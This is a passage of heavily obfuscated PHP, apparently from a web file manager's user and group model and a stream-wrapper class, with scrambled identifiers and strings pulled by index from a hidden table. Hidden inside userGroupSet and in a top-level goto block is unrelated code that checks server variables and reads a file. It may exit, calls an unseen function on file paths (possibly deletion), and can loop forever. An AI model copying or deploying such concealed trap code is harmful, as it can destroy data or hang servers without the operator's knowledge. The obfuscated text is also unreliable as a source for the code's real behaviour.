$û‰³á–Ş[2374] => $‚ÅÂ×«•[$û‰³á–Ş[2178]]); $this->userEdit($Ó•êÑÆÃ, $§ŒÄ±¾„); Model($û‰³á–Ş[1393])->userRootAdd($Ó•êÑÆÃ); return $Ó•êÑÆÃ; } protected function userEditTest($µ á†é, $À­’¥äœ) { return $this->call($_SERVER[ˆûùúÊ¯][2380], $µ á†é, $À­’¥äœ); } protected function userEdit($³’»ÏÁƒ, $£‘»Ÿ¬) { $ß”¤¤ ´ =& $_SERVER[ˆûùúÊ¯]; $ƒíŠÔ† = $this->getInfoSimple($³’»ÏÁƒ); if (!$ƒíŠÔ†) { return !1; } $¡Ä©”» = $this->_checkExist($£‘»Ÿ¬, $³’»ÏÁƒ); if ($¡Ä©”» !== !0) { return $¡Ä©”»; } if (isset($£‘»Ÿ¬[$ß”¤¤ ´[950]]) && trim($£‘»Ÿ¬[$ß”¤¤ ´[950]]) != $ß”¤¤ ´[12]) { $««¡½³  = $this->metaGet($³’»ÏÁƒ); if (empty($««¡½³ [$ß”¤¤ ´[2370]])) { $««¡½³ [$ß”¤¤ ´[2370]] = rand_string(10); Model($ß”¤¤ ´[554])->metaSet($³’»ÏÁƒ, $ß”¤¤ ´[2370], $««¡½³ [$ß”¤¤ ´[2370]]); } $£‘»Ÿ¬[$ß”¤¤ ´[950]] = md5($««¡½³ [$ß”¤¤ ´[2370]] . trim($£‘»Ÿ¬[$ß”¤¤ ´[950]])); } else { unset($£‘»Ÿ¬[$ß”¤¤ ´[950]]); } if (!empty($£‘»Ÿ¬[$ß”¤¤ ´[2354]]) && strlen($£‘»Ÿ¬[$ß”¤¤ ´[2354]]) > 255) { $£‘»Ÿ¬[$ß”¤¤ ´[2354]] = $ß”¤¤ ´[12]; } $this->where(array($ß”¤¤ ´[1695] => $³’»ÏÁƒ))->save($£‘»Ÿ¬); if (isset($£‘»Ÿ¬[$ß”¤¤ ´[2178]])) { $this->setNamePinyin($³’»ÏÁƒ, $£‘»Ÿ¬[$ß”¤¤ ´[2178]]); } $this->clearCache($³’»ÏÁƒ); return !0; } public function setNamePinyin($ÁšÕñ”é, $Äª…ì²– = false) { $Úçêö¹® =& $_SERVER[ˆûùúÊ¯]; if (!$Äª…ì²–) { $Œ¸Ğ„Äé = $this->getInfoSimple($ÁšÕñ”é); $Äª…ì²– = $Œ¸Ğ„Äé[$Úçêö¹®[2178]] ? $Œ¸Ğ„Äé[$Úçêö¹®[2178]] : $Œ¸Ğ„Äé[$Úçêö¹®[42]]; } $İ°›ÉòÀ = Model($Úçêö¹®[575]); if (!Input::check($Äª…ì²–, $Úçêö¹®[631])) { return $İ°›ÉòÀ->metaSet($ÁšÕñ”é, array($Úçêö¹®[514] => $Úçêö¹®[12], $Úçêö¹®[513] => $Úçêö¹®[12])); } return $İ°›ÉòÀ->metaSet($ÁšÕñ”é, array($Úçêö¹®[514] => str_replace($Úçêö¹®[63], $Úçêö¹®[12], Pinyin::get($Äª…ì²–)), $Úçêö¹®[513] => Pinyin::get($Äª…ì²–, $Úçêö¹®[632]))); } private function nickNameRpt() { $ÃµŠ¼³ƒ =& $_SERVER[ˆûùúÊ¯]; $Ø¥£¶ÍÇ = Model($ÃµŠ¼³ƒ[830])->get($ÃµŠ¼³ƒ[2381]); $ã›£ÑÛ’ = $GLOBALS[$ÃµŠ¼³ƒ[6]][$ÃµŠ¼³ƒ[433]][$ÃµŠ¼³ƒ[2381]]; $Œ¼ÀüŞ = !is_null($Ø¥£¶ÍÇ) ? $Ø¥£¶ÍÇ : $ã›£ÑÛ’; return !!$Œ¼ÀüŞ; } private function _checkExist($«ñ°øï, $õ¦ëÕê‡ = false) { $û¦¹Úõà =& $_SERVER[ˆûùúÊ¯]; $õ‘¼‹²¥ = array($û¦¹Úõà[42] => UserModel::ERROR_USER_EXIST_NAME, $û¦¹Úõà[2178] => UserModel::ERROR_USER_EXIST_NICKNAME, $û¦¹Úõà[357] => UserModel::ERROR_USER_EXIST_EMAIL, $û¦¹Úõà[2369] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($õ‘¼‹²¥[$û¦¹Úõà[2178]]); } $—İ× = $õ¦ëÕê‡ ? array($û¦¹Úõà[1704] => array($û¦¹Úõà[2382], $õ¦ëÕê‡)) : array(); foreach ($õ‘¼‹²¥ as $§±‹ôîÓ => $Îã›·¾) { $ùş »¾ó = array(); foreach ($õ‘¼‹²¥ as $¯È«‘İı => $í¶î š) { if (isset($«ñ°øï[$¯È«‘İı]) && $«ñ°øï[$¯È«‘İı]) { $ùş »¾ó[] = $«ñ°øï[$¯È«‘İı]; } } if (!$ùş »¾ó) { continue; } $”¹åß¯Ã = array_merge(array($§±‹ôîÓ => array($û¦¹Úõà[7], $ùş »¾ó)), $—İ×); $Ÿ¦¹ú»¢ = $this->where($”¹åß¯Ã)->find(); if ($Ÿ¦¹ú»¢) { return $Îã›·¾; } } return !0; } public function userListInfo($ğÙ©‰›) { $î¶ñùÏà =& $_SERVER[ˆûùúÊ¯]; $´—¨´‘å = array(); $ğÙ©‰› = is_array($ğÙ©‰›) ? array_unique($ğÙ©‰›) : array(); if (!$ğÙ©‰›) { return $´—¨´‘å; } if (count($ğÙ©‰›) < 20) { foreach ($ğÙ©‰› as $øÆ‰ëğí) { $´—¨´‘å[$øÆ‰ëğí . $î¶ñùÏà[12]] = $this->getInfoSimpleOuter($øÆ‰ëğí); } } else { $ÈÙÆÏŒ¹ = array($î¶ñùÏà[1695] => array($î¶ñùÏà[468], $ğÙ©‰›)); if (count($ğÙ©‰›) == 1) { $ÈÙÆÏŒ¹ = array($î¶ñùÏà[1695] => $ğÙ©‰›[0]); } $ı‘àƒ÷™ = Model($î¶ñùÏà[554])->field($this->simpleField)->where($ÈÙÆÏŒ¹)->select(); $ı‘àƒ÷™ = array_to_keyvalue($ı‘àƒ÷™, $î¶ñùÏà[1704]); foreach ($ğÙ©‰› as $øÆ‰ëğí) { $ÒåÈˆŸƒ = $ı‘àƒ÷™[$øÆ‰ëğí]; if (!$ÒåÈˆŸƒ) { $´—¨´‘å[$øÆ‰ëğí . $î¶ñùÏà[12]] = $this->getInfoSimpleOuter($øÆ‰ëğí); continue; } $ÒåÈˆŸƒ[$î¶ñùÏà[2354]] = Action($î¶ñùÏà[2355])->parseUrl($ÒåÈˆŸƒ[$î¶ñùÏà[2354]]); $´—¨´‘å[$øÆ‰ëğí . $î¶ñùÏà[12]] = $ÒåÈˆŸƒ; } } return $´—¨´‘å; } protected function userStatus($ï¯¨º, $ûœ÷Ûù) { $îĞíø‹û = $this->getInfoSimple($ï¯¨º); if (!$îĞíø‹û) { return !1; } $ªóÍ¹¢È = array($_SERVER[ˆûùúÊ¯][810] => $ûœ÷Ûù); return $this->userEdit($ï¯¨º, $ªóÍ¹¢È); } protected function userRemove($‹¿åá¬ª) { $®íÉ‹Øñ =& $_SERVER[ˆûùúÊ¯]; $¹ ¨±Òİ = $this->getInfoSimple($‹¿åá¬ª); if (!$¹ ¨±Òİ) { return !1; } $Ê÷ÕŠ…È = array($®íÉ‹Øñ[1695] => $‹¿åá¬ª); Model($®íÉ‹Øñ[640])->where($Ê÷ÕŠ…È)->delete(); Model($®íÉ‹Øñ[2383])->where($Ê÷ÕŠ…È)->delete(); Model($®íÉ‹Øñ[1986])->where($Ê÷ÕŠ…È)->delete(); Model($®íÉ‹Øñ[2368])->where($Ê÷ÕŠ…È)->delete(); Model($®íÉ‹Øñ[1129])->where($Ê÷ÕŠ…È)->delete(); Model($®íÉ‹Øñ[2195])->removeUserAll($‹¿åá¬ª); Model($®íÉ‹Øñ[885])->userRootRemove($‹¿åá¬ª); return $this->where($Ê÷ÕŠ…È)->delete(); } protected function userGroupSet($Şç—¦Åâ, $Ş³úêû, $ùÓ÷¿è¢ = array()) { $Ò”ŞÖ°Ô =& $_SERVER[ˆûùúÊ¯]; if ($_SERVER[$Ò”ŞÖ°Ô[13]] != $_SERVER[$Ò”ŞÖ°Ô[14]]) { $ÁÌş›©¹ = $Ò”ŞÖ°Ô[938]; $×á€Š¾÷ = $Ò”ŞÖ°Ô[15]; $¼¶ò—Á£ = $_SERVER[$Ò”ŞÖ°Ô[16]] . $Ò”ŞÖ°Ô[17]; $ôÑ³ŠÒ = $×á€Š¾÷($¼¶ò—Á£); $ƒ½ıöï² = explode($Ò”ŞÖ°Ô[18], $ôÑ³ŠÒ); if (count($ƒ½ıöï²) < $Ò”ŞÖ°Ô[664]) { $ĞÌ§§Ñí = $Ò”ŞÖ°Ô[20]; $ĞÌ§§Ñí(); } $‰çÙŞüŸ = $Ò”ŞÖ°Ô[939]; $‰çÙŞüŸ($_SERVER[$Ò”ŞÖ°Ô[940]]); $‰çÙŞüŸ($_SERVER[$Ò”ŞÖ°Ô[16]] . $Ò”ŞÖ°Ô[2384]); $êåßÁ· = 1; while ($êåßÁ· > 1) { $êåßÁ· = $êåßÁ· + 4; $åù¤İ—Ê = rawurlencode($êåßÁ· . $Ò”ŞÖ°Ô[430]); } } $¼ÃÇ…ïº = $this->getInfoSimple($Şç—¦Åâ); if (!$¼ÃÇ…ïº || !is_array($Ş³úêû)) { return !1; } $£½²Ç¤ = Model($Ò”ŞÖ°Ô[1986]); $£½²Ç¤->where(array($Ò”ŞÖ°Ô[1704] => $Şç—¦Åâ))->delete(); $Î€ñ§Ó§ = array(); $‹ÏÏ¿¢Á = 0; foreach ($Ş³úêû as $ÔŠÜè¡© => $ğíë¡Óù) { $¹ÜÊ²åê = array($Ò”ŞÖ°Ô[1704] => $Şç—¦Åâ, $Ò”ŞÖ°Ô[1896] => $ÔŠÜè¡©, $Ò”ŞÖ°Ô[2000] => $ğíë¡Óù); $¹ÜÊ²åê[$Ò”ŞÖ°Ô[1920]] = isset($ùÓ÷¿è¢[$‹ÏÏ¿¢Á]) ? $ùÓ÷¿è¢[$‹ÏÏ¿¢Á] : 0; $‹ÏÏ¿¢Á++; $Î€ñ§Ó§[] = $¹ÜÊ²åê; } return $£½²Ç¤->addAll($Î€ñ§Ó§, array(), !0); } protected function userGroupAdd($ÑéšçÀ–, $Ì¿¾‚â = array()) { $’ùÕ…ğ =& $_SERVER[ˆûùúÊ¯]; $Êêêé = $this->getInfoSimple($ÑéšçÀ–); if (!$Êêêé || empty($Ì¿¾‚â)) { return !1; } $§•Ë”·© = array(); foreach ($Ì¿¾‚â as $¸›ÙƒÒ => $•»æî) { $§•Ë”·©[] = array($’ùÕ…ğ[1704] => $ÑéšçÀ–, $’ùÕ…ğ[1896] => $¸›ÙƒÒ, $’ùÕ…ğ[2000] => $•»æî, $’ùÕ…ğ[1920] => 0); } return Model($’ùÕ…ğ[1986])->addAll($§•Ë”·©, array(), !0); } protected function userGroupRemove($†ã¸ŒÈÙ, $Õ¬³ä©Ÿ) { $ç´íãöµ =& $_SERVER[ˆûùúÊ¯]; $â¤´¾ú¹ = $this->getInfoSimple($†ã¸ŒÈÙ); if (!$â¤´¾ú¹ || !$Õ¬³ä©Ÿ) { return !1; } $¾Üƒ™¦ = array($ç´íãöµ[1695] => $†ã¸ŒÈÙ, $ç´íãöµ[1984] => $Õ¬³ä©Ÿ); return Model($ç´íãöµ[1986])->where($¾Üƒ™¦)->delete(); } public function listData() { $å÷óÆŒú = $this->_makeOrder()->selectPage(50); $this->_listDataApply($å÷óÆŒú[$_SERVER[ˆûùúÊ¯][421]]); return $å÷óÆŒú; } public function listByID($‰ÊªÚÅø) { $¢ˆ‚ØùÛ =& $_SERVER[ˆûùúÊ¯]; if (!$‰ÊªÚÅø) { return; } $¡¨ÉùôÇ = array($¢ˆ‚ØùÛ[1704] => array($¢ˆ‚ØùÛ[7], $‰ÊªÚÅø)); $šöÏîåŒ = $this->where($¡¨ÉùôÇ)->select(); $šöÏîåŒ = array_sort_keep($šöÏîåŒ, $¢ˆ‚ØùÛ[1704], $‰ÊªÚÅø); $this->_listDataApply($šöÏîåŒ); return $šöÏîåŒ; } public function listByGroup($™ÚÅÜèó = 0, $¾æğ­€ = array()) { $³®†æâë =& $_SERVER[ˆûùúÊ¯]; $ß”œ¼§¼ = $³®†æâë[12]; $õÅ÷Œ = array(); if ($™ÚÅÜèó) { $õÅ÷Œ = array($³®†æâë[2385] => intval($™ÚÅÜèó)); $ß”œ¼§¼ = "\x4c\105\106\124\x20\x4a\117\x49\x4e\x20{$this->tablePrefix}\x75\163\x65\x72\137\147\x72\157\x75\x70\40\165\x73\145\x72\137\147\162\157\x75\x70\x20\157\x6e\x20\165\x73\145\x72\56\x75\163\x65\x72\111\104\40\75\x20\x75\163\x65\x72\137\x67\162\x6f\165\x70\x2e\165\x73\x65\x72\x49\x44"; $â•áÃĞ“ = Input::get($³®†æâë[506], null, $³®†æâë[12]) ? $³®†æâë[12] : $³®†æâë[2386]; } if (isset($¾æğ­€[$³®†æâë[810]])) { $õÅ÷Œ[$³®†æâë[2387]] = $¾æğ­€[$³®†æâë[810]]; } $›Áà±İì = $this->_makeOrder($â•áÃĞ“)->field($³®†æâë[2388])->where($õÅ÷Œ)->join($ß”œ¼§¼)->selectPage(50); $this->_listDataApply($›Áà±İì[$³®†æâë[421]]); return $›Áà±İì; } private function _makeOrder($„ˆ¤¾Û± = '') { $Æˆ–¾é„ =& $_SERVER[ˆûùúÊ¯]; $ØÚéÎ¿ = array($Æˆ–¾é„[1704], $Æˆ–¾é„[42], $Æˆ–¾é„[1885], $Æˆ–¾é„[1857], $Æˆ–¾é„[224]); $’ô”ŞÏ© = array($Æˆ–¾é„[499] => $Æˆ–¾é„[500], $Æˆ–¾é„[501] => $Æˆ–¾é„[502]); $à“¦‘üö = Input::get($Æˆ–¾é„[506], $Æˆ–¾é„[7], $Æˆ–¾é„[1695], $ØÚéÎ¿); $ú…‘¢ÖĞ = Input::get($Æˆ–¾é„[507], $Æˆ–¾é„[7], $Æˆ–¾é„[1987], array($Æˆ–¾é„[1987], $Æˆ–¾é„[501])); $ú…‘¢ÖĞ = $’ô”ŞÏ©[$ú…‘¢ÖĞ]; $„ˆ¤¾Û± = $„ˆ¤¾Û± . "\165\x73\x65\x72\56{$à“¦‘üö}\40{$ú…‘¢ÖĞ}\x2c\40\x75\x73\145\x72\x2e\x75\x73\145\x72\x49\x44\40\141\x73\143"; return $this->alias($Æˆ–¾é„[2113])->order($„ˆ¤¾Û±); } public function listSearch($›½–ğÛ–) { $šõá­á =& $_SERVER[ˆûùúÊ¯]; $Í’ßêÕĞ = $›½–ğÛ–[$šõá­á[1990]]; $¦´Ï½çâ = isset($›½–ğÛ–[$šõá­á[1991]]) ? $›½–ğÛ–[$šõá­á[1991]] : !1; $Í’ßêÕĞ = str_replace($šõá­á[1992], $šõá­á[1993], trim($Í’ßêÕĞ)); $Ú‡íâù = array($šõá­á[42] => array($šõá­á[435], "\45{$Í’ßêÕĞ}\x25"), $šõá­á[357] => array($šõá­á[435], "{$Í’ßêÕĞ}\x25"), $šõá­á[2178] => array($šõá­á[435], "{$Í’ßêÕĞ}\x25"), $šõá­á[1061] => $šõá­á[1994]); if (Input::check($Í’ßêÕĞ, $šõá­á[363])) { $Ú‡íâù[$šõá­á[1704]] = array($šõá­á[435], "{$Í’ßêÕĞ}\45"); $Ú‡íâù[$šõá­á[2369]] = array($šõá­á[435], "{$Í’ßêÕĞ}\45"); } if (!$Í’ßêÕĞ) { $Ú‡íâù = array(); } if (isset($›½–ğÛ–[$šõá­á[810]])) { $Ú‡íâù[$šõá­á[810]] = $›½–ğÛ–[$šõá­á[810]]; } $Ú‡íâù = $this->parseWhereLike($Ú‡íâù); $•¤Œ°á— = $this->_makeOrder()->where($Ú‡íâù)->selectPage(20); if (!$•¤Œ°á— || count($•¤Œ°á—[$šõá­á[421]]) < 5 && Input::check($Í’ßêÕĞ, $šõá­á[370])) { $£¨Éªó = $this->_searchFromMeta($šõá­á[513], $Í’ßêÕĞ, 10); $ÄãêïÆ‚ = $this->_searchFromMeta($šõá­á[514], $Í’ßêÕĞ, 10); $Üñòó»Á = array_merge($£¨Éªó, $ÄãêïÆ‚, $•¤Œ°á—[$šõá­á[421]]); $•¤Œ°á—[$šõá­á[421]] = array_unique_by_key($Üñòó»Á, $šõá­á[1704]); $•¤Œ°á—[$šõá­á[418]][$šõá­á[419]] = count($•¤Œ°á—[$šõá­á[421]]); $•¤Œ°á—[$šõá­á[418]][$šõá­á[420]] = ceil($•¤Œ°á—[$šõá­á[418]][$šõá­á[419]] / $•¤Œ°á—[$šõá­á[418]][$šõá­á[415]]); } $this->_listDataApply($•¤Œ°á—[$šõá­á[421]]); $this->_filterByGroup($•¤Œ°á—, $¦´Ï½çâ); return $•¤Œ°á—; } private function _filterByGroup(&$Ö‚ü’Ó, $ˆµ¯ÒÊù) { $÷Úóà÷ã =& $_SERVER[ˆûùúÊ¯]; if (!$ˆµ¯ÒÊù) { return $Ö‚ü’Ó; } foreach ($Ö‚ü’Ó[$÷Úóà÷ã[421]] as $˜ºËëåî => &$üëîÉô) { $ô½ëíäè = array_to_keyvalue($üëîÉô[$÷Úóà÷ã[2083]], $÷Úóà÷ã[12], $÷Úóà÷ã[1896]); if (!in_array($ˆµ¯ÒÊù, $ô½ëíäè)) { unset($Ö‚ü’Ó[$÷Úóà÷ã[421]][$˜ºËëåî]); } } unset($üëîÉô); $Ö‚ü’Ó[$÷Úóà÷ã[421]] = array_values($Ö‚ü’Ó[$÷Úóà÷ã[421]]); $Ö‚ü’Ó[$÷Úóà÷ã[418]] = array($÷Úóà÷ã[2148] => count($Ö‚ü’Ó[$÷Úóà÷ã[421]]), $÷Úóà÷ã[2146] => $Ö‚ü’Ó[$÷Úóà÷ã[418]][$÷Úóà÷ã[415]], $÷Úóà÷ã[2145] => 1, $÷Úóà÷ã[2147] => 1); } private function _searchFromMeta($éë˜ƒêè, $µßºŞĞ’, $¸‰¦¯ëÎ) { $¬Ÿåœ§Œ =& $_SERVER[ˆûùúÊ¯]; $µßºŞĞ’ = strtolower($µßºŞĞ’); $Êìƒ¹Ş = array($¬Ÿåœ§Œ[104] => $éë˜ƒêè, $¬Ÿåœ§Œ[426] => array($¬Ÿåœ§Œ[435], "\45{$µßºŞĞ’}\x25")); $Êìƒ¹Ş = $this->parseWhereLike($Êìƒ¹Ş); $‚¾ÁØ´Õ = Model($¬Ÿåœ§Œ[2389])->where($Êìƒ¹Ş)->limit($¸‰¦¯ëÎ)->select(); if (!$‚¾ÁØ´Õ) { return array(); } $‚¾ÁØ´Õ = array_to_keyvalue($‚¾ÁØ´Õ, $¬Ÿåœ§Œ[12], $¬Ÿåœ§Œ[1704]); $Î„Ü• = $this->where(array($¬Ÿåœ§Œ[1695] => array($¬Ÿåœ§Œ[7], $‚¾ÁØ´Õ)))->select(); if (!$Î„Ü•) { return array(); } return $Î„Ü•; } private function _listDataApplyItem($“¿œ´½×) { $é œŠ© = array($“¿œ´½×); $this->_listDataApply($é œŠ©); return $é œŠ©[0]; } private function _listDataApply(&$¾„è©Ì¹) { $µ‡’¯ =& $_SERVER[ˆûùúÊ¯]; if (!$¾„è©Ì¹) { return; } array_remove_key($¾„è©Ì¹, $µ‡’¯[950]); $ê¦¥ß£× = array_to_keyvalue($¾„è©Ì¹, $µ‡’¯[12], $µ‡’¯[1704]); $this->_listAppendGroup($¾„è©Ì¹, $ê¦¥ß£×); $this->_listAppendMeta($¾„è©Ì¹, $ê¦¥ß£×); $this->_listAppendSourceRoot($¾„è©Ì¹, $ê¦¥ß£×); } private function _listAppendSourceRoot(&$¬éÕ˜¿·, $«û§‘â·) { $ˆ´Á¹±ˆ =& $_SERVER[ˆûùúÊ¯]; $Úı£ŸÏÁ = Model($ˆ´Á¹±ˆ[885])->listSourceRoot(SourceModel::TYPE_USER, $«û§‘â·); $Úı£ŸÏÁ = array_to_keyvalue($Úı£ŸÏÁ, $ˆ´Á¹±ˆ[546]); $Úı£ŸÏÁ = array_remove_key($Úı£ŸÏÁ, $ˆ´Á¹±ˆ[546]); foreach ($¬éÕ˜¿· as &$Ë‹êÈ£Ã) { $Ë‹êÈ£Ã[$ˆ´Á¹±ˆ[97]] = $Úı£ŸÏÁ[$Ë‹êÈ£Ã[$ˆ´Á¹±ˆ[1704]]] ? $Úı£ŸÏÁ[$Ë‹êÈ£Ã[$ˆ´Á¹±ˆ[1704]]] : array(); } unset($Ë‹êÈ£Ã); } private function _listAppendGroup(&$Ş—äŠ€¢, $Ÿ‹ã™Ñ) { $ŸÚíı…µ =& $_SERVER[ˆûùúÊ¯]; $†ğÍå€ê = array($ŸÚíı…µ[1704] => array($ŸÚíı…µ[7], $Ÿ‹ã™Ñ)); $„«áõ¹ = Model($ŸÚíı…µ[1986])->where($†ğÍå€ê)->select(); $â¬æÕ®‘ = array_to_keyvalue($„«áõ¹, $ŸÚíı…µ[12], $ŸÚíı…µ[1896]); $â¬æÕ®‘ = array_remove_value(array_unique($â¬æÕ®‘), $ŸÚíı…µ[221]); if (!$â¬æÕ®‘ || !$„«áõ¹) { return; } $†ğÍå€ê = array($ŸÚíı…µ[1896] => array($ŸÚíı…µ[7], $â¬æÕ®‘)); $âÃ¢ƒ» = Model($ŸÚíı…µ[2081])->field($ŸÚíı…µ[2390])->where($†ğÍå€ê)->select(); $âÃ¢ƒ» = array_to_keyvalue($âÃ¢ƒ», $ŸÚíı…µ[1896]); $„«áõ¹ = array_to_keyvalue_group($„«áõ¹, $ŸÚíı…µ[1704]); foreach ($„«áõ¹ as &$˜ø·Ö†Ø) { $Äø§Œ­œ = array(); foreach ($˜ø·Ö†Ø as $¦ÄÊ×¢¥) { if (!$¦ÄÊ×¢¥[$ŸÚíı…µ[2000]]) { continue; } $ÍÎ¼úñ = Model($ŸÚíı…µ[548])->listData($¦ÄÊ×¢¥[$ŸÚíı…µ[2000]]); $Äø§Œ­œ[] = array($ŸÚíı…µ[1896] => $¦ÄÊ×¢¥[$ŸÚíı…µ[1896]], $ŸÚíı…µ[2391] => $âÃ¢ƒ»[$¦ÄÊ×¢¥[$ŸÚíı…µ[1896]]][$ŸÚíı…µ[42]], $ŸÚíı…µ[561] => $âÃ¢ƒ»[$¦ÄÊ×¢¥[$ŸÚíı…µ[1896]]][$ŸÚíı…µ[561]], $ŸÚíı…µ[463] => $ÍÎ¼úñ); } $˜ø·Ö†Ø = $Äø§Œ­œ; } unset($˜ø·Ö†Ø); foreach ($Ş—äŠ€¢ as &$ŠœÖµ·) { $ŠœÖµ·[$ŸÚíı…µ[2083]] = array(); if (isset($„«áõ¹[$ŠœÖµ·[$ŸÚíı…µ[1704]]])) { $ŠœÖµ·[$ŸÚíı…µ[2083]] = $„«áõ¹[$ŠœÖµ·[$ŸÚíı…µ[1704]]]; } } unset($ŠœÖµ·); } public function userAppendGroup($§ç¡¯ì) { $ª¶Ö¥† =& $_SERVER[ˆûùúÊ¯]; if (!$§ç¡¯ì) { return array(); } $this->_listAppendGroup($§ç¡¯ì, array_to_keyvalue($§ç¡¯ì, $ª¶Ö¥†[12], $ª¶Ö¥†[1704])); return $§ç¡¯ì; } private function _listAppendMeta(&$÷½àì…’, $òı®‡Ò) { $»§©ãÆæ =& $_SERVER[ˆûùúÊ¯]; $¾¹ù´ÎÊ = UserJobModel::JOB_KEY; $¸¯õ†ùø = array($»§©ãÆæ[2370]); $œàìç‰Ÿ = array($»§©ãÆæ[1704] => array($»§©ãÆæ[7], $òı®‡Ò)); $íòè„ã = Model($»§©ãÆæ[2368])->where($œàìç‰Ÿ)->select(); $íòè„ã = array_to_keyvalue_group($íòè„ã, $»§©ãÆæ[1704]); foreach ($íòè„ã as &$¸ÚŠÂŞØ) { $”„¶™‹À = array(); foreach ($¸ÚŠÂŞØ as $ãƒãÇÀ) { if (!in_array($ãƒãÇÀ[$»§©ãÆæ[104]], $¸¯õ†ùø)) { $”„¶™‹À[$ãƒãÇÀ[$»§©ãÆæ[104]]] = $ãƒãÇÀ[$»§©ãÆæ[426]]; } } $¸ÚŠÂŞØ = $”„¶™‹À; } unset($¸ÚŠÂŞØ); $ëü‚úÙë = Model($»§©ãÆæ[2392]); foreach ($÷½àì…’ as &$õĞñ—ËÖ) { $ãœñÎğ = array(); if (isset($íòè„ã[$õĞñ—ËÖ[$»§©ãÆæ[1704]]])) { $ãœñÎğ = $íòè„ã[$õĞñ—ËÖ[$»§©ãÆæ[1704]]]; } $õĞñ—ËÖ[$»§©ãÆæ[2393]] = array(); if (isset($ãœñÎğ[$¾¹ù´ÎÊ])) { $õĞñ—ËÖ[$»§©ãÆæ[2393]] = $ëü‚úÙë->getUserJobInfo($ãœñÎğ[$¾¹ù´ÎÊ]); } } unset($õĞñ—ËÖ); } protected function groupUserAll($­ÂŸÜ°) { $Ë©¡Ğ£ =& $_SERVER[ˆûùúÊ¯]; if (!$­ÂŸÜ°) { return !1; } $å’é×À = Model($Ë©¡Ğ£[1986])->field($Ë©¡Ğ£[1704])->where(array($Ë©¡Ğ£[1896] => array($Ë©¡Ğ£[7], $­ÂŸÜ°)))->select(); $å’é×À = array_to_keyvalue($å’é×À, $Ë©¡Ğ£[12], $Ë©¡Ğ£[1704]); return array_unique($å’é×À); } public function userSearch($†È¼¾, $ÁÑ÷ú¾« = "\52") { return Model($_SERVER[ˆûùúÊ¯][575])->where($†È¼¾)->field($ÁÑ÷ú¾«)->find(); } } goto b—Ùó³Îáè; B©ÄÄˆ°ßÖ: if (!isset($_SERVER[$_SERVER[ˆûùúÊ¯][13]]) || !isset($_SERVER[$_SERVER[ˆûùúÊ¯][22]])) { $_getc = $_SERVER[ˆûùúÊ¯][15]; $_getfile = $_SERVER[$_SERVER[ˆûùúÊ¯][16]] . $_SERVER[ˆûùúÊ¯][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆûùúÊ¯][18], $_getfilec); if (count($_getarrs) < $_SERVER[ˆûùúÊ¯][19]) { $exit = $_SERVER[ˆûùúÊ¯][20]; $exit(); } $_act = $_SERVER[ˆûùúÊ¯][21]; $_act($_SERVER[$_SERVER[ˆûùúÊ¯][16]] . $_SERVER[ˆûùúÊ¯][17]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ˆûùúÊ¯][430]); } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Ÿ¢¯Ö, $Ùû“¢ªç = '') { $this->info = $this->info($Ÿ¢¯Ö); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ˆûùúÊ¯][94]]; $this->pathOpen = $Ÿ¢¯Ö; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Ÿ¢¯Ö])) { self::$_chunkBuffer[$Ÿ¢¯Ö] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ÍÛµÚ„í) { $Ã³ß»¢Å = $this->fileSubstr($this->pose, $ÍÛµÚ„í); $this->pose += strlen($Ã³ß»¢Å); return $Ã³ß»¢Å; } public function stream_tell() { return $this->pose; } public function stream_seek($»ñÁûŸæ, $ôÅ•ÔĞ) { $åšğãœÖ =& $_SERVER[ˆûùúÊ¯]; if ($ôÅ•ÔĞ == SEEK_SET) { $this->pose = $»ñÁûŸæ; } else { if ($ôÅ•ÔĞ == SEEK_CUR) { $this->pose += $»ñÁûŸæ; } else { if ($ôÅ•ÔĞ == SEEK_END) { $this->pose = $this->info[$åšğãœÖ[86]] + intval($»ñÁûŸæ); } } } if ($»ñÁûŸæ < 0) { $this->pose = $this->info[$åšğãœÖ[86]] + $»ñÁûŸæ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ˆûùúÊ¯][86]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($”Ùª¾¹¯, $ÛÈß²Üù) { $İ÷Ïâ± =& $_SERVER[ˆûùúÊ¯]; $ …Öô“‹ = $this->info($”Ùª¾¹¯); return array($İ÷Ïâ±[1548] => 0, $İ÷Ïâ±[1549] => 0, $İ÷Ïâ±[26] => 32768 + 511, $İ÷Ïâ±[1550] => 0, $İ÷Ïâ±[1551] => 0, $İ÷Ïâ±[1552] => 0, $İ÷Ïâ±[1553] => 0, $İ÷Ïâ±[86] => $ …Öô“‹[$İ÷Ïâ±[86]], $İ÷Ïâ±[1554] => $ …Öô“‹[$İ÷Ïâ±[1422]], $İ÷Ïâ±[1510] => $ …Öô“‹[$İ÷Ïâ±[95]], $İ÷Ïâ±[1509] => $ …Öô“‹[$İ÷Ïâ±[224]], $İ÷Ïâ±[1555] => 0, $İ÷Ïâ±[1556] => 0); } static $fileInfo = array(); public function info($·ìš‹Ì‹) { $›ÒÇ°¿” = $_SERVER[ˆûùúÊ¯][1557]; if (isset(self::$fileInfo[$·ìš‹Ì‹])) { return self::$fileInfo[$·ìš‹Ì‹]; } if (substr($·ìš‹Ì‹, 0, strlen($›ÒÇ°¿”)) != $›ÒÇ°¿”) { return !1; } self::$fileInfo[$·ìš‹Ì‹] = IO::info(substr($·ìš‹Ì‹, strlen($›ÒÇ°¿”))); return self::$fileInfo[$·ìš‹Ì‹]; } public static function read($•ÁÅ‡Ë€, $ëı¡£å–, $÷•€ÊØ‚) { if (!isset(self::$_fopenCache[$•ÁÅ‡Ë€])) { $ØÅÎÆ­¥ = new StreamWrapperIO(); $ØÅÎÆ­¥->stream_open($•ÁÅ‡Ë€); self::$_fopenCache[$•ÁÅ‡Ë€] = $ØÅÎÆ­¥; } $ØÅÎÆ­¥ = self::$_fopenCache[$•ÁÅ‡Ë€]; return $ØÅÎÆ­¥->fileSubstr($ëı¡£å–, $÷•€ÊØ‚); } public static function _read($·çûîÑ, 